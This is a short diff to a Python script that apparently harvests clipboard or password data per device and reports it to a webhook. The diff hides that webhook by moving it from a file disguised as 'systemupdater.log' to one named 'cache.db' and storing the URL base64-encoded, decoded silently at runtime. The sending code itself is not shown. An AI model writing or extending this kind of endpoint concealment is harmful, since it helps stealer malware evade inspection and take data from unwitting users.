@@ -9,6 +9,7 @@ import getpass
 import pyperclip
 import os
 import sys
+import base64
 from datetime import datetime, timedelta
 
 def get_active_mac():
@@ -28,14 +29,13 @@ def get_active_mac():
 
 DEVICE_ID = f"DEVICE-{get_active_mac().replace(':', '')}"
 
-def load_webhook_from_file(filename="systemupdater.log"):
+def load_webhook_from_file(filename="cache.db"):
     try:
         exe_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
         full_path = os.path.join(exe_dir, filename)
         with open(full_path, "r", encoding="utf-8") as f:
-            for line in f:
-                if line.strip().startswith("http"):
-                    return line.strip()
+            encoded = f.read().strip()
+            return base64.b64decode(encoded).decode("utf-8")
     except:
         pass
     return None
